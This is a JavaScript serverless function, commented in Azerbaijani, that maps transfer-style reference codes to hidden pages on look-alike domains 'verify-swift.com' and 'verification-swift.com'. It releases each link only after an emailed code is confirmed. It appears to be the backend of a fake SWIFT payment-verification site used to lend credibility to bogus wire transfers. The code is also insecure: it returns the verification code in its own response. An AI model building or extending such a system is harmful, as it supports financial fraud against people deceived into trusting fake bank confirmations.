const refMap = {
    'COBA300525CH59279': 'https://verification-swift.com/verification-cob.html',
    'COBA310625CH68412': 'https://verification-swift.com/verification-cob-abnab',
    'COBA011125CH77290': 'https://verify-swift.com/verification-code-abnaz.html',
    'COBA011125CH86478': 'https://verify-swift.com/verification-abnzdf',
    'COBA780533CH12564': 'https://verify-swift.com/verification-cob-aznasdf',
    'RZBA780533WW25874': 'https://verify-swift.com/verification-cob-xbnetzr',
    'COBA780533CH25879': 'https://verify-swift.com/verification-cob-nzb198adm',
    'COBA310625CH665478': 'https://verify-swift.com/verification-cob-sdf6589db23',
    'COBA515626CH63378': 'https://verify-swift.com/verification-cob-pdg32541ab25',
    'CBA17112248B401-130226': 'https://verify-swift.com/verification-cob-utg566290vcd77',
    'DEU17112212C456-170326': 'https://verify-swift.com/verification-cob-sam54df677',
    'CBA17112248B401-160226': 'https://verify-swift.com/verification-cob-bm65tb7654xz',
    'DEU349827091C679-230326': 'https://verify-swift.com/verification-cob-cju228ac749nb',
    'CBA17112248B401-230226': 'https://verify-swift.com/verfication-cob-an653cbt789g',
    'RCAS29016976S': 'https://verify-swift.com/check/verify/verifymt199/index.html',
    'DEU549325112B147-270326': 'https://verify-swift.com/verification-cob-ds145av41sa17n',
    '2026-03-30-2020A76': 'https://verify-swift.com/check/verify/verifymt199/mt996as7821vba921',
    'EXIMDJACK23032026': 'https://verify-swift.com/check/verify/verifymt199/gh667ai88b09',
    'EXIMDJACK14042026': 'https://verify-swift.com/check/verify/verifymt199/mt552jh770bvc.html',
    'REL-TX-20260424-00': 'https://verify-swift.com/check/verify/verifymt199/dh33487a-bs-006',
    'EXIM/DJ/FIN/28042026-882': 'https://verify-swift.com/check/verify/verifymt199/mt996-as-99902bnd1',
    'UBS21618/234U/MT996': 'https://verify-swift.com/check/verify/verifymt199/ub6689-0-nm211',
    'DEU17112212C332-280426': 'https://verify-swift.com/verification-mt103-bcl5596mb21as21',
    'MMGEU050526ERSTE100M': 'https://verification-swift.com/verification-mt103-bcl01478yt58xd88',
    'DEU17112212C332-230326': 'https://verify-swift.com/verfication-cob-by653atm688v'
};

// Kodlar RAM-da müvəqqəti saxlanılır
let verificationCodes = {};

exports.handler = async (event) => {
    if (event.httpMethod !== "POST") return { statusCode: 405, body: "Metod Səhvdir" };
    
    const data = JSON.parse(event.body);
    const { action, ref, email, code } = data;

    // 1. Referans Yoxlama
    if (action === "checkRef") {
        return {
            statusCode: 200,
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ success: !!refMap[ref] })
        };
    }

    // 2. Kod Göndərmə
    if (action === "sendEmail") {
        const generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
        verificationCodes[email] = generatedCode;
        
        // DİQQƏT: Buraya öz email göndərmə kodunu (send-email.js-dəki kimi) əlavə etməlisən.
        return {
            statusCode: 200,
            body: JSON.stringify({ success: true, debugCode: generatedCode }) 
        };
    }

    // 3. Final Doğrulama və Gizli Linkin Göndərilməsi
    if (action === "verifyFinal") {
        if (verificationCodes[email] === code) {
            const finalUrl = refMap[ref];
            delete verificationCodes[email]; // Kodu sil
            return {
                statusCode: 200,
                body: JSON.stringify({ success: true, redirect: finalUrl })
            };
        }
        return { statusCode: 400, body: JSON.stringify({ success: false }) };
    }
};
